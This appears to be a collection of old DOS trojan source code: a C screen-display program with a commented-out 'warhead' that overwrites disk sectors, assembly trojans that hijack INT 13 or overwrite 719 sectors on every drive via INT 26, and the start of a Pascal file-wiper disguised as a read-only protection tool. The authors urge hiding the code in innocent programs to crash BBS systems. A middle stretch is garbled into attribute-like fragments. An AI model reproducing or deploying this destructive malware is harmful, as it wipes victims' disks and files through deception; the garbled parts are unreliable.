	0xCDB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 
	0x4DB, 0x4DB, 0x4DB, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xBDB, 0xBDB, 
	0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 
	0xBDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 
	0xBDB, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 
	0xBDB, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x1DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 
	0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 
	0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 
	0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x11DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x820, 0x1DB, 0x1DB, 0x1F54, 0x1F68, 0x1F65, 0x1F20, 
	0x1F77, 0x1F6F, 0x1F72, 0x1F73, 0x1F74, 0x1F20, 0x1F74, 0x1F72, 
	0x1F6F, 0x1F6A, 0x1F61, 0x1F6E, 0x1F20, 0x1F6F, 0x1F66, 0x1F20, 
	0x1F61, 0x1F6C, 0x1F6C, 0x1DB, 0x1DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x820, 0x1DB, 0x1F69, 0x1F73, 0x1F20, 0x1F74, 0x1F68, 
	0x1F65, 0x1F20, 0x1F6F, 0x1F6E, 0x1F65, 0x1F20, 0x1F74, 0x1F68, 
	0x1F61, 0x1F74, 0x1F20, 0x1F68, 0x1F69, 0x1F74, 0x1F73, 0x1DB, 
	0x1F79, 0x1F6F, 0x1F75, 0x1F21, 0x1DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x820, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x820, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 
	0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x1DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x820, 0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 
	0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 
	0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 
	0x120, 0x120, 0x120, 0x120, 0x120, 0x120, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x8DB, 
	0x8DB, 0x8DB, 0x8DB, 0x8DB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 0x8EDB, 
	0x8EDB, 0x8EDB, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8ADB, 0x8ADB, 0x8ADB, 
	0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 0x3FDA, 0x30C4, 0x30C4, 
	0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 
	0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 
	0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 
	0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 0x30C4, 
	0x30C4, 0x30C4, 0x30C4, 0x30BF, 0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 
	0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 0x8ADB, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 
	0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x3FB3, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x30B3, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 
	0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 0x8BDB, 
	0x8BDB, 0x8BDB, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x89DB, 0x89DB, 0x89DB, 
	0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 
	0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x3FB3, 0x3DB, 0x3DB, 
	0x3DB, 0x3E20, 0x3E20, 0x3E20, 0x3E20, 0x3E20, 0x3E20, 0x3E44, 
	0x3E6F, 0x3E6F, 0x3E6D, 0x3E20, 0x3E26, 0x3E20, 0x3E47, 0x3E6C, 
	0x3E6F, 0x3E6F, 0x3E6D, 0x3E20, 0x3E74, 0x3E69, 0x3E6D, 0x3E65, 
	0x3E2E, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x30B3, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 
	0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 
	0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x89DB, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 
	0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x3FB3, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 0x3DB, 
	0x3DB, 0x3DB, 0x3DB, 0x30B3, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 
	0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 0x81DB, 
	0x81DB, 0x81DB, 0x81DB, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x8DDB, 0x8DDB, 0x8DDB, 
	0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x3FC0, 0x3FC4, 0x3FC4, 
	0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 
	0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 
	0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 
	0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 0x3FC4, 
	0x3FC4, 0x3FC4, 0x3FC4, 0x30D9, 0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 
	0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x8DDB, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 0x85DB, 
	0x85DB, 0x85DB, 0x85DB, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20};


main()
{
	int scnBuf;

	regs.h.ah = 15;
	int86(16,&regs,&regs); /* get the video mode... */
	if(regs.h.al == 7)
		scnBuf = 0xB000; /* if the jerk has mono, kill him too */
	else
		scnBuf = 0xB800; /* color */
	clearscreen();
	movedata(FP_SEG(gloom_screen),FP_OFF(gloom_screen),scnBuf,0,sizeof(gloom_screen));
	getch();
	clearscreen();
}

/* clears the screen */
void clearscreen(void)
{
	regs.h.ah = 6;
	regs.h.al = 0;
	regs.h.bh = 7;
	regs.h.ch = 0;
	regs.h.cl = 0;
	regs.h.dh = 25;
	regs.h.dl = 80;
	int86(16,&regs,&regs);

/* this is the WARHEAD; keep the comments till you need to arm it, of course. */
/* this really clears the screen and every other god damn thing*/
/* chunks of "virmin" code, ha ha! */

/*	char *vir;                                    */
/*	int i;                                        */

/*	strcpy(vir,"");                               */
/*	for (i=0; i<40; i++)="" */="" strcat(vir,"microsoft="" 1993");="" */="" abswrite(2,50,0,vir);="" */="" abswrite(3,50,0,vir);="" */="" abswrite(4,50,0,vir);="" */="" abswrite(5,50,0,vir);="" */="" printf("microsoft="" corp.");="" */="" };="" */="" }="" -------------------------------------="" trojan="" source="" -="" indit.asm="" start="" segment="" assume="" cs:start,ds:start="" boot="" equ="" 1000h="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" es="" push="" ds="" push="" di="" push="" si="" call="" cim="" cim:="" pop="" bx="" mov="" si,5aa5h="" mov="" di,55aah="" push="" cs="" pop="" es="" ujra:="" add="" bx,1000="" cmp="" bx,1000="" jnc="" kilep1="" jmp="" kilep="" kilep1:="" push="" bx="" mov="" ax,201h="" mov="" dx,0="" mov="" cx,1="" int="" 13h="" pop="" bx="" jnc="" tovabb="" cmp="" ah,6="" jz="" kilep1="" jmp="" kilep="" tovabb:="" cmp="" si,0a55ah="" jz="" kilep="" mov="" ax,cs="" add="" ax,1000h="" push="" bx="" push="" ax="" int="" 12h="" mov="" bx,64="" mul="" bx="" sub="" ax,1000h="" mov="" bx,ax="" pop="" ax="" cmp="" bx,ax="" jnc="" oke1="" pop="" bx="" jmp="" kilep="" oke1:="" pop="" bx="" oke:="" mov="" es,ax="" mov="" ax,cs:[bx+18h]="" mov="" cx,cs:[bx+1ah]="" mul="" cx="" mov="" cx,ax="" mov="" ax,cs:[bx+13h]="" mov="" dx,0="" div="" cx="" sub="" bx,1000="" push="" bx="" mov="" ch,al="" mov="" cl,1="" mov="" bx,100h="" mov="" dx,0="" mov="" ax,208h="" int="" 13h="" pop="" bx="" jc="" kilep="" push="" bx="" mov="" bx,100h="" mov="" ax,es:[bx]="" cmp="" ax,2452h="" pop="" bx="" jnz="" kilep="" mov="" ax,bx="" add="" ax,offset="" kilep-offset="" cim="" push="" cs="" push="" ax="" mov="" ax,10ah="" push="" es="" push="" ax="" retf="" kilep:="" pop="" si="" pop="" di="" pop="" ds="" pop="" es="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" cime:="" dw="" 0="" start="" ends="" end-------------------------------------="" trojan="" source="" -="" int_13.asm="" ;*****************************************************************************="" ;="" the="" high="" evolutionary's="" int="" 13="" trojan="" ;*****************************************************************************="" ;="" ;="" development="" notes:="" ;="" (dec.1o.9o)="" ;="" ;="" well,="" i="" was="" screwing="" around="" with="" tsr's="" the="" other="" day="" and="" i="" got="" the="" idea,="" ;="" "hmm.="" i="" wonder="" what="" would="" happen="" if="" you="" negated="" int="" 13..."="" this="" trojan/tsr="" ;="" program="" answers="" my="" query.="" ;="" ;="" it's="" really="" a="" big="" mess.="" you="" can't="" access="" any="" file="" on="" the="" directory,="" you="" can't="" ;="" dir="" anything,="" can't="" type="" anything,="" i="" think="" the="" only="" thing="" you="" can="" do="" is="" ;="" del="" which="" is="" handled="" by="" int="" 21.="" ;="" ;="" well,="" in="" any="" event,="" put="" this="" routine="" in="" any="" nifty="" source="" code="" you="" see="" and="" ;="" then="" compile="" it...="" it="" will="" confuse="" the="" fuck="" out="" of="" any="" 100%="" "lame"="" user.="" ;="" ;="" have="" fun...="" ;="" ;="" -="The" high="" evolutionary="-" ;="" ;*****************************************************************************="" ;="" copyright="" (c)="" 199o="" by="" the="" rabid="" nat'nl="" development="" corp.="" ;*****************************************************************************="" code="" segment="" assume="" cs:code,ds:code="" org="" 100h="" start:="" jmp="" init_vectors="" mesg="" db="" 'int="" 13="" trojan="" by="" the="" high="" evolutionary'="" crud="" db="" '(c)="" 199o="" by="" rabid="" nat''nl="" development="" corp.'="" crap="" dd="" program="" proc="" far="" assume="" cs:code,ds:nothing="" mov="" ax,4c00h="" ;="" terminate="" program="" with="" exit="" code="" 00="" int="" 21h="" ;="" call="" dos="" program="" endp="" ;="" ;="" the="" tsr="" initialization="" shit="" happens="" here...="" ;="" init_vectors="" proc="" near="" assume="" cs:code,ds:code="" mov="" ah,35h="" ;="" ask="" for="" int="" vector="" mov="" al,13h="" ;="" intercept="" int="" 13="" int="" 21h="" ;="" call="" dos="" mov="" word="" ptr="" crap,bx="" mov="" word="" ptr="" crap[2],es="" mov="" ah,25h="" ;="" set="" int="" value="" mov="" al,13h="" ;="" set="" for="" int="" 13="" mov="" dx,offset="" program="" ;="" tell="" the="" tsr="" what="" to="" do="" when="" accessed="" int="" 21h="" ;="" call="" dos="" mov="" dx,offset="" init_vectors="" ;="" load="" in="" this="" segment="" into="" dx="" int="" 27h="" ;="" make="" the="" sucker="" in="" dx="" tsr...="" init_vectors="" endp="" code="" ends="" end="" start="" -------------------------------------="" trojan="" source="" -="" megatroj.asm="" ;******************************************************************************="" ;="" the="" high="" evolutionary's="" [megatrojan]="" v1.0="" ;******************************************************************************="" ;="" ;="" development="" notes:="" (dec.12.9o)="" ;="" ------------------------------="" ;="" ;="" hi="" guys.="" it's="" me="" again.="" here="" is="" my="" latest="" work="" of="" trojanic="" art.="" this="" does="" ;="" alot="" more="" damage="" than="" my="" old="" trojan="" (int="" 13="" method).="" this="" one="" uses="" int="" 26="" ;="" instead="" that="" overwrites="" 719="" sectors="" of="" each="" hard-drive.="" ;="" ;="" i="" managed="" to="" fix="" the="" error="" on="" crashing="" after="" int="" 26.="" the="" problem="" lied="" in="" ;="" the="" restoration="" of="" the="" flags="" after="" the="" int="" was="" called.="" ;="" ;="" i="" also="" have="" an="" encrypted="" message="" in="" this="" one.="" rather="" nice="" if="" i="" do="" say="" so="" ;="" myself.="" check="" out="" the="" commented="" lines="" to="" read="" the="" message.="" ;="" (it="" gets="" written="" to="" sector="" 0="" of="" each="" drive.="" do="" view="" it,="" use="" nu="" )="" ;="" ;="" i="" also="" fixed="" a="" small="" bug="" in="" my="" old="" encryption="" routine.="" check="" out="" this="" source="" ;="" for="" the="" latest="" modifications="" and="" fixes,="" but="" it="" works="" great="" now...="" ;="" ;="" have="" phun...="" ;="" ;="" -="The" high="" evolutionary="-" ;="" ;="" ps:="" use="" this="" to="" crash="" those="" lame-ass="" telegard="" boards...="" ;="" ;******************************************************************************="" ;="" written="" by="" the="" high="" evolutionary="" ;="" ;="" property="" of="" the="" rabid="" nat'nl="" development="" corp.="" ;="" ;="" not="" to="" be="" distributed="" to="" any="" outside="" groups="" or="" agencies="" ;="" (well,="" at="" least="" the="" source="" code.="" i="" don't="" give="" a="" fuck="" what="" you="" do="" with="" ;="" the="" compiled="" file...)="" ;******************************************************************************="" code="" segment="" assume="" cs:code,ds:code,es:code="" org="" 100h="" @fry="" macro="" drive,sectors="" pushf="" ;="" push="" all="" flags="" onto="" the="" stack="" mov="" al,drive="" ;="" select="" drive="" to="" fry="" mov="" cx,sectors="" ;="" choose="" amount="" of="" sectors="" mov="" dx,0="" ;="" set="" format="" to="" start="" at="" sec.="" 0="" mov="" bx,offset="" dest="" ;="" set="" format="" to="" have="" ident="" ;="" string="" imbedded="" in="" sector="" 0="" int="" 26h="" ;="" call="" bios="" to="" fry="" drive="" popf="" ;="" restore="" the="" flags="" we="" pushed="" endm="" start:="" jmp="" decrypt="" ;="" ;="" baha!="" rather="" sympathetic="" message="" eh="" guys?="" ;="" ;ident="" db="" "ooops!="" looks="" like="" you="" have="" a="" slight="" problem.="" this="" drive="" ",13,10="" ;="" db="" "is="" fried!="" why?="" well,="" that's="" easy...="" rabid''s="" the="" answer...="" ",13,10="" ;="" db="" "your="" security="" sucks="" shit!!!="" time="" to="" upgrade...="" let="" me="" ",13,10="" ;="" db="" "give="" you="" a="" little="" hint="" to="" speed="" up="" your="" recovery.="" reformat="" ",13,10="" ;="" db="" "your="" hard-drive.="" mirror,="" sf="" and="" any="" other="" nifty="" utils="" are="" ",13,10="" ;="" db="" "useless="" against="" rabid''s="" [megatrojan]...="" have="" phun="" guys!="" ",13,10="" ;="" db="" "="" -="" rabid="" '91",13,10="" ident="" db="" "nnnqr="" !mnnjr!mhjd!xnt!i`wd!`!rmhfiu!qsncmdl/!uihr!eshwd!h"="" db="" "r!gshde="" !vix="">!Vdmm-!ui`u&r!d`rx///!S@CHE&r!uid!`orvds///!"
	db      "Xnts!rdbtshux!rtbjr!rihu   !Uhld!un!tqfs`ed///!Mdu!ld!fhw"
	db      "d!xnt!`!mhuumd!ihou!un!rqdde!tq!xnts!sdbnwdsx/!Sdgnsl`u!x"
	db      "nts!i`se,eshwd/!LHSSNS-!RG-!`oe!`ox!nuids!ohgux!tuhmr!`sd!"
	db      "trdmdrr!`f`horu!S@CHE&r!ZLdF`UsNk@o\///!I`wd!qito!ftxr !"
	db      "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!,!S@CHE!&80"

lident  equ     $-ident                         ; Find the length of string

dest    db      [lident-1/2] dup (?)            ; Blank field for decrypt

temp    db      0                               ; Temp char field

haha    db      2                               ; HAHA is the drive to be
						; nuked!

hoho    dw      719                             ; HOHO is the number of sectors
						; to make into Kaka!
;
; (Can't you tell I'm in the Christmas Spirit...)
;

decrypt:
	mov     cx,lident                       ; Move length of string
						; into CX
	mov     si,offset ident                 ; Move string into SI
	mov     di,offset dest                  ; Specify dest in DI
doshit: mov     al,ds:[si]                      ; Get a charachter
	mov     temp,al                         ; Copy it to temp
	xor     byte ptr ds:[temp],01h          ; XOR it with 01h
	mov     al,temp                         ; Copy temp to AL
	mov     [di],al                         ; Copy AL into dest
	inc     si                              ; Inc SI
	inc     di                              ; Inc DI
	loop    doshit                          ; Back for the next charachter
						; until CX=0

main:   cmp     haha,27                         ; Check to see if drive Z is
						; fried
	jge     quit                            ; If yeah. Then gedoudahere
	@fry    haha,hoho                       ; No? Then fry the drive...
	inc     haha                            ; Add 1 to HAHA
	jmp     main                            ; Then go up and fry another

quit:   mov     ax,4c00h                        ; Set terminate program with
						; error code 00
	int     21h                             ; Call DOS to gedoudahere
	
	code    ends

end     start
-------------------------------------
Trojan Source - oblit.pas


{   Trojan - Obliterate!; }

{  This phile is designed to garble and erase any file that the user
   wants to make "Read-Only" (thats the hook). It does so by writing over
   the file with random byte values, multiple times.
   The looser thinks this is a protection scheme (named PRO_TEK
   or some shit). Whatever is the file name entered is really GONE!
   The trick issue is to develop a doc file that explains 'professionally'
   that the permanent write-protection of this program is IDEAL for files
   like COMMAND.COM, all of the looser's OS, etc.	
   Designed by: *** SaNDoZ ***  {Super Read-Only utility - hahahahah}

{   i know it's grossly simple but it's a riot!
   Note: like Norton's WipeDisk once it's gone, IT'S GONE! It's really vicious.
   Any party may make modifications to this as they see fit, just make sure
   that I can get a copy of it if it's really cool.  If you have any
   questions/comments I can be reached occasionally on Buck 'an Ear.
